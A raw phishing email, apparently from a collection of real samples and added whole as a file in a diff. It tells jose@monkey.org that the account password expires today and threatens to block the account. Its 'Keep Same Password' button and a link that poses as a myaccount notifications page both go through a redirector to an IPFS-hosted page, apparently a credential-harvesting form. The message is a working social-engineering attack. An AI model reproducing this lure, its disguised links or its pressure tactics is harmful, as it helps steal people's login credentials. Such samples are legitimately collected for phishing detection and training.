@@ -1,0 +1,154 @@
+Return-Path: a.skorupa@jarbur.pl
+Delivered-To: jose@monkey.org
+X-FDA: 81682683936.30.66C64A9
+Received: from leeblazer.com (unknown [92.246.136.192])
+	by imf27.b.hostedemail.com (Postfix) with ESMTP id 4E7071A000A
+	for <jose@monkey.org>; Mon, 15 Jan 2024 20:28:46 +0000 (UTC)
+Authentication-Results: imf27.b.hostedemail.com;	dkim=none;	spf=fail
+ (imf27.b.hostedemail.com: domain of a.skorupa@jarbur.pl does not designate
+ 92.246.136.192 as permitted sender) smtp.mailfrom=a.skorupa@jarbur.pl;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1705350526;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=88SEeeU0I3jsPujgGIEauoRAdFjKMi0+5as4OnX9zBk=;
+	b=wLkahJjiAMEoVLEI8Z8gi0PPiPxG2+8JH29Dory6qjxnkkkWWKVzrkv+y5SexW1yU3K9MQ
+	5Xpr3X2/GZTJhehOG7ZYciQzmXSQNLzTmS3eUEAlwFaCwOyxXUV1tz1oahAbUGRm8Ekjuc
+	Vqr+DXmTabnWPzMm9SJDaQvx0jD2ch4=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1705350526; a=rsa-sha256;
+	cv=none;
+	b=thqLg5MJ66xs/VCTEUHCr9/VxpkEmZ/vktg7JL9uPPDWtihH8Pa0HRrIUjcITcyOsNJ7BQ
+	4qz8tEmAXzCPEiSGKgesar56alPUsLYlcKkP+0F1bnmXiUboiHVr8eegKoinU6+Vs2DnD+
+	CsIXqDzDwZx2ji0/2H7x6yrZckVjhts=
+ARC-Authentication-Results: i=1;	imf27.b.hostedemail.com;	dkim=none;	spf=fail
+ (imf27.b.hostedemail.com: domain of a.skorupa@jarbur.pl does not designate
+ 92.246.136.192 as permitted sender) smtp.mailfrom=a.skorupa@jarbur.pl;
+	dmarc=none
+From: jose<a.skorupa@jarbur.pl>
+To: jose@monkey.org
+Subject: Password Update: Keep same password jose@monkey.org
+Date: 15 Jan 2024 21:28:05 +0100
+Message-ID: <20240115212805.F6212A6760C90332@jarbur.pl>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="windows-1252"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam12
+X-Rspam-User: 
+X-Spam-Status: Yes, score=10.70
+X-Stat-Signature: dmt9z1gzjfzetwjcyq1e7dioeqas9ohu
+X-Rspamd-Queue-Id: 4E7071A000A
+X-HE-Tag: 1705350526-933502
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19oTaiZa+3u3WktNai7ieDD5tR4NLsdvNH4xkDgOLdrk4v?=
+ =?utf-8?q?3zGy7DAVLBv7Oo/BhUZEHd8wt1R6fdf7ADyv6A2AUYNE3BKMl0iSqHcJyF1oAPDYU?=
+ =?utf-8?q?wr3i50KIAb3O4xfiaXmYoMHqg6Cwf3VIF1ebszH2IrIrq3klnK2iep1C7KPo24Xq8?=
+ =?utf-8?q?d+bIjpPLcPIrnxCwxl7fIaCS+h1GA1JDJeni9iqlWn2QvdKR0E=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 23
+
+<html>
+<head>
+	<meta content=3D"en-us" http-equiv=3D"Content-Language" />
+	<meta content=3D"text/html; charset=3Dwindows-1252" http-equiv=3D"Content-=
+Type" />
+	<title></title>
+</head>
+<body>
+<table border=3D"1" cellpadding=3D"0" cellspacing=3D"0" class=3D"x_MsoNorma=
+lTable" style=3D"font-style: normal; font-variant: normal; font-weight: nor=
+mal; width: 1335px; border-image: initial; border-left: medium none; border=
+-right: medium none; border-top: medium none; border-bottom: 3pt solid rgb(=
+227, 234, 244)">
+	<tbody>
+		<tr>
+			<td style=3D"white-space: normal !important; border: medium none; paddin=
+g-left: 16.5pt; padding-right: 16.5pt; padding-top: 0in; padding-bottom: 0i=
+n" valign=3D"top">
+			<div style=3D"font-style: normal; font-variant: normal; font-weight: nor=
+mal; vertical-align: baseline; color: inherit; border: 0px none; margin: 0p=
+x; padding: 0px">
+			<p class=3D"x_MsoNormal" style=3D"font-size: 11pt; font-family: Calibri,=
+ sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margin=
+-top: 0in; margin-bottom: 0.0001pt">&nbsp;</p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 11pt; font-family: Calibri,=
+ sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margin=
+-top: 0in; margin-bottom: 0.0001pt"><span style=3D"font-style: inherit; fon=
+t-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size:=
+ 9pt; line-height: inherit; font-family: Helvetica, sans-serif; vertical-al=
+ign: baseline; color: black !important; border: 0px none; margin: 0px; padd=
+ing: 0px">Dear jose@monkey.org,<br />
+			<br aria-hidden=3D"true" />
+			The password for your email account (jose@monkey.org),&nbsp;expires toda=
+y&nbsp;<font color=3D"#CC3300">1/15/2024 9:28:05 p.m.,.</font></span></p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 11pt; font-family: Calibri,=
+ sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margin=
+-top: 0in; margin-bottom: 0.0001pt"><span style=3D"font-style: inherit; fon=
+t-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size:=
+ 9pt; line-height: inherit; font-family: Helvetica, sans-serif; vertical-al=
+ign: baseline; color: black !important; border: 0px none; margin: 0px; padd=
+ing: 0px">Keep and continue with the same password using the below portal.<=
+br aria-hidden=3D"true" />
+			&nbsp;</span></p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 9pt; font-family: Helvetica=
+, sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margi=
+n-top: 0in; margin-bottom: 0.0001pt">&nbsp;</p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 9pt; font-family: Helvetica=
+, sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margi=
+n-top: 0in; margin-bottom: 0.0001pt"><font face=3D"Times New Roman" size=3D=
+"2"><b style=3D"margin:3px; padding:13px; background-color: rgb(0, 102, 204=
+); "><a href=3D"https://papi3.brws.vc/url/NTUxYmMyZTEtYjExMC00OTRkLTgyYjYtZ=
+GY3MWIxNTFmZGYx?q=3Dhttps://bafkreiagunr2sbunsmqb7eaoa5x5qeonkicuthxuoq3rzy=
+y3s775dzknie.ipfs.dweb.link/?jose@monkey.org" style=3D"color: rgb(255, 255,=
+ 255); text-decoration: none;">&nbsp;<font id=3D"xv">Keep&nbsp; Same&nbsp;P=
+assword&nbsp; </font> </a> </b></font></p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 9pt; font-family: Helvetica=
+, sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margi=
+n-top: 0in; margin-bottom: 0.0001pt">&nbsp;</p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 9pt; font-family: Helvetica=
+, sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margi=
+n-top: 0in; margin-bottom: 0.0001pt"><br />
+			Access&nbsp;to&nbsp; this account will&nbsp;be&nbsp;restrict&nbsp;and&nb=
+sp;block&nbsp;till&nbsp;proper&nbsp;verification.</p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 9pt; font-family: Helvetica=
+, sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margi=
+n-top: 0in; margin-bottom: 0.0001pt">&nbsp;</p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 11pt; font-family: Calibri,=
+ sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margin=
+-top: 0in; margin-bottom: 0.0001pt"><span style=3D"font-style: inherit; fon=
+t-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size:=
+ 9pt; line-height: inherit; font-family: Helvetica, sans-serif; vertical-al=
+ign: baseline; color: black !important; border: 0px none; margin: 0px; padd=
+ing: 0px">You can also see security activity at<br />
+			<a href=3D"https://papi3.brws.vc/url/NTUxYmMyZTEtYjExMC00OTRkLTgyYjYtZGY=
+3MWIxNTFmZGYx?q=3Dhttps://bafkreiagunr2sbunsmqb7eaoa5x5qeonkicuthxuoq3rzyy3=
+s775dzknie.ipfs.dweb.link/?jose@monkey.org">https://myaccount.jose@monkey.o=
+rg/notifications</a></span></p>
+
+			<p class=3D"x_MsoNormal" style=3D"font-size: 11pt; font-family: Calibri,=
+ sans-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margin=
+-top: 0in; margin-bottom: 0.0001pt">&nbsp;</p>
+			</div>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<p class=3D"x_MsoNormal" style=3D"font-size: 7pt; font-family: Calibri, san=
+s-serif; line-height: 12pt; margin-left: 0in; margin-right: 0in; margin-top=
+: 0in; margin-bottom: 0.0001pt">&nbsp;</p>
+</body>
+</html>
+
